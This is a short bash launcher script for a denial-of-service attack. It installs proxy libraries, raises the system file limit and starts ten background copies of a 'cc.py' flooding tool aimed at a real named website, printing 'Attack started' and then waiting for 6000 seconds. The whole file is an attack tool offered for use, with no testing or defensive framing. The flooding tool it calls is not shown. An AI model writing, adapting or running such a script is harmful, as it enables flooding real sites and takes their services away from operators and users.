#!/bin/bash
#
#  Please prepared proxies list at first.
#  And then change the command in atk_cmd
#  And change the process number
#  Lastly run this script
#
#the command you want to exec

atk_cmd="python3 cc.py -url https://bygcloud.com -down -check -v 5"

pip3 install requests pysocks

#number of process that you want
process=10

#change the system limit
sudo ulimit -n 999999

echo Attack started
for ((i=1;i<=$process;i++))
do
  $atk_cmd >/dev/null &
  sleep 0.1
done
echo Started
sleep 6000
